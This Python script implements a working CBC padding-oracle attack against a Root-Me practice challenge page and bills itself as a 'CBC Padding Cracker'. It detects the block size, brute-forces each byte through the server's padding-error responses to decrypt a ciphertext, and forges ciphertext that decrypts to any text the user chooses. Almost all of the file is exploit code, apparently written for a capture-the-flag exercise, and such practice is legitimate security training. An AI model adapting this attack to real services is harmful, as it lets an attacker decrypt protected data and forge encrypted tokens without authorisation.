import requests
import os


URL = "http://challenge01.root-me.org/realiste/ch12/index.aspx"

s1 = "Padding Error"
s2 = "File not found"
s3 = "Page OK"

ORANGE = "\033[38;5;214m"
WHITE = "\033[37m"
GREEN = "\033[32m"
RED = "\033[31m"

HEX_BYTES = []

for i in range(256):
    hex_value = f"{i:02X}"
    HEX_BYTES.append(hex_value)


def getNextCypher(page_name="Home"):
    res = requests.get(URL).text
    home_index = res.index(f">{page_name}</a>")
    return res[home_index-65:home_index-1]

def getRessource(ressource):
    return requests.get(URL+"?c="+ressource).text

def paddingStatus(response):
    if response.__contains__(s1):
        return s1
    elif response.__contains__(s2):
        return s2
    else:
        return s3

def getBlockSize():
    cypher = getNextCypher()

    if (len(cypher)//2)%16 == 8: return 8
    
    test_pad = cypher + cypher[-16*2:]  # 2 letters = 1 byte

    a = getRessource(test_pad)
    if paddingStatus(a) == s1:
        return 16
    else:
        return 8

def hex_to_binary(hex_str):
    decimal_value = int(hex_str, 16)
    binary_str = bin(decimal_value)[2:]
    return binary_str

def getBlocks(block_size, cypher):
    blocks = []
    block = ""
    for k in range(len(cypher)):
        if (k+1)%(block_size*2) == 1 and k != 0:
            blocks.append(block)
            block = ""
        block += cypher[k]
    blocks.append(block)

    return blocks

def blockToCypher(blocks):
    c = ""
    for b in blocks:
        c += b
    return c

def modifyBlock(block, val, blocks, ind):
    assert(len(blocks[block]) > ind and len(blocks) > block and ind > 0)
    pre = blocks[block][:ind-1] 
    if len(blocks[block]) > ind+1:
        su = blocks[block][ind+1:]
        res = pre+val+su
    else:
        res = pre+val

    blocks[block] = res


# def paddingSlideTest():
#     # tester la taille du padding en modifiant petit à petit les valeurs à la fin
#     n = len(b)
#     counter = 1
#     for i in range(1, n+1):
#         for j in range(block_size*2 - 1, 0, -2):
#             current_val = b[n-i][j-1:j+1]
#             hb2 = HEX_BYTES.copy()
#             hb2.remove(current_val)
#             new_cypher = blockToCypher(modifyBlock(n-i, hb2[0], b.copy(), j))
#             printable_cypher = blockToCypher(modifyBlock(n-i, f"{ORANGE}{hb2[0]}{WHITE}", b.copy(), j))
#             status = paddingStatus(getRessource(new_cypher))
#             print(status, printable_cypher, " Byte: ", counter)
#             counter += 1

def guess(c, x, pad, block_size, Pn, Dn):
    # we have x^d = pad (valid padding)
    # hence d = pad^x
    # and we have c^d = plain
    int_x = int(x, 16)
    int_c = int(c, 16)
    int_d = pad ^ int_x

    Pn[block_size-pad], Dn[block_size-pad] = int_c ^ int_d, int_d

def fuzzCk(b, k=0):
    n = len(b)
    pad_step = 1  # always = j+1
    to_print = f"Block: {k+1}\n"
    s = ""
    ok = False
    Pn = [0]*block_size
    Dn = [0]*block_size
    SIZE = block_size*2

    for j in range(SIZE - 1, 0, -2):
        current_val = b[k][j-1:j+1]
        blocks = b.copy()

        # if we are at at least padding 0x02
        for p in range(pad_step-1):
            # we modify d to generate a valid padding
            block_ind = SIZE - 2*p - 1
            valid_padding = Dn[block_size-p-1] ^ (pad_step)
            modifyBlock(k, f"{valid_padding:02X}", blocks, block_ind)
        
        for val in HEX_BYTES:
            blocks_cpy = blocks.copy()

            # now, d values will generate a valid padding
            # we have to bruteforce the next one to have a valid padding
            modifyBlock(k, val, blocks_cpy, j)
            new_cypher = blockToCypher(blocks_cpy)

            # copy of blocks to have a fancy print
            modifyBlock(k, f"{ORANGE}{val}{WHITE}", bcpy:=blocks_cpy.copy(), j)
            printable_cypher = blockToCypher(bcpy)

            # verify wether or not the oracle validated the padding
            status = paddingStatus(getRessource(new_cypher))
            s = f"{status} {printable_cypher} Byte: {block_size-pad_step+1}\n"
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f"{to_print}{s}")
            if status != s1: # and val != current_val:
                ok = True
                break
        
        to_print += f"{GREEN if ok else RED}{status} {new_cypher} {val if ok else None} Byte {block_size-pad_step+1}{WHITE}\n"
        os.system('cls' if os.name == 'nt' else 'clear')
        if ok:
            guess(c=current_val, x=val, pad=pad_step, block_size=block_size, Pn=Pn, Dn=Dn)
            to_print += f"Found d[{block_size-pad_step+1}]={hex(Dn[block_size-pad_step])} and p[{block_size-pad_step+1}]={hex(Pn[block_size-pad_step])}\n"
        
        print(to_print)

        ok = False
        pad_step += 1   

    return Pn, Dn


def buildBlock(desired_plain, block_size, Dn):
    # recall that C1^D2 = P2
    # hence if we want C1^D2 = desired_plain
    # we build C1 as C1 = desired_plain^D2
    
    # add padding to the desired plain text to validate the decryption
    assert(block_size >= len(desired_plain))
    block = ""
    for i in range(len(desired_plain)):
        block += f"{ord(desired_plain[i])^Dn[i]:02X}"

    pad_len = block_size - len(desired_plain)
    for j in range(i+1, i+1+pad_len):
        block += f"{pad_len^Dn[j]:02X}"

    return block




ban = """

---------------------------------------------------------------------------------

 ██████╗██████╗  ██████╗    ██████╗  █████╗ ██████╗ ██████╗ ██╗███╗   ██╗ ██████╗     
██╔════╝██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝     
██║     ██████╔╝██║         ██████╔╝███████║██║  ██║██║  ██║██║██╔██╗ ██║██║  ███╗    
██║     ██╔══██╗██║         ██╔═══╝ ██╔══██║██║  ██║██║  ██║██║██║╚██╗██║██║   ██║    
╚██████╗██████╔╝╚██████╗    ██║     ██║  ██║██████╔╝██████╔╝██║██║ ╚████║╚██████╔╝    
 ╚═════╝╚═════╝  ╚═════╝    ╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     
                                                                                      
            ██████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗                               
            ██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗                              
            ██║     ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝                              
            ██║     ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗                              
            ╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║                              
             ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                              


----------------------------------By @b3liott------------------------------------                                                                                               

"""

if __name__ == "__main__":
    print(ban)
    block_size = getBlockSize()
    print("Taille des blocks: ", block_size)
    # s = getNextCypher()
    s = "89F5521A211FF0E015DF5CF04294513A8C4868B3AC517B3F72144F0B8A703B77"
    print("Cypher sample: ", s)
    print("Blocks: ", b:=getBlocks(block_size, s))

    input("Press enter to attack...")
    Pn, Dn = fuzzCk(b=b)

    message = ""
    for v in Pn:
        message += chr(v)

    print(f"{GREEN} ----------------------- DECRYPTED MESSAGE: {message} -----------------------{WHITE}")

    craft = input("Do you want to craft a custom cypher, which will lead to a desired plaintext ? (y/n) ")
    if craft.lower() == "y":
        desired_plain = input("Enter the desired plain text: ")
        C1 = buildBlock(desired_plain, block_size, Dn)
        C2 = b[1]
        new_cypher = blockToCypher(C1 + C2)
        print(new_cypher)
